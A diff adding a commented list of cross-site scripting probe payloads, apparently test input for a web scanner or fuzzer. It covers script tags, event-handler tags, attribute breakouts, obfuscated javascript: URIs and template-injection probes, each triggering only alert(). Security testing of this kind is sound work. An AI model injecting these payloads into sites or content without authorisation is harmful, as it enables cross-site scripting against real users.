@@ -1,0 +1,51 @@
+# XSS probe payloads - one per line, # lines are comments.
+# Classic script context
+<script>alert(1)</script>
+# Classic image onerror
+<img src=x onerror=alert(1)>
+# Body onload
+<body onload=alert(1)>
+# SVG onload
+<svg onload=alert(1)>
+# SVG with animation
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>
+# Details toggle
+<details open ontoggle=alert(1)>
+# Input autofocus onfocus
+<input autofocus onfocus=alert(1)>
+# Marquee onstart
+<marquee onstart=alert(1)>x</marquee>
+# Video onerror
+<video><source onerror=alert(1)>
+# Iframe srcdoc
+<iframe srcdoc="<script>alert(parent.domain)</script>">
+# Script with javascript URI in anchor
+<a href="javascript:alert(1)">click</a>
+# Breaking out of a quoted attribute
+"><svg onload=alert(1)>
+# Breaking out of single-quoted attribute
+'><svg onload=alert(1)>
+# Double quote breakout with img
+"><img src=x onerror=alert(1)>
+# Event handler without quotes
+<img src=x onerror=alert(1)//>
+# Uppercase tag
+<SVG ONLOAD=alert(1)>
+# Mixed case with encoded chars
+<ScRiPt>alert(1)</ScRiPt>
+# Template literal / expression
+${alert(1)}
+# Angular-style template injection probe
+{{7*7}}
+# Onerror with this
+<img src=x onerror="alert(document.domain)">
+# DOM clobbering-ish form
+<form><input name=attributes><input name=attributes>
+# Base64-ish data URI in iframe
+<iframe src="data:text/html,<script>alert(1)</script>">
+# javascript: with tab obfuscation
+<a href="java&#x09;script:alert(1)">click</a>
+# Style expression (old IE, historical)
+<div style="width:expression(alert(1))">
+# Meta refresh javascript
+<meta http-equiv="refresh" content="0;javascript:alert(1)">
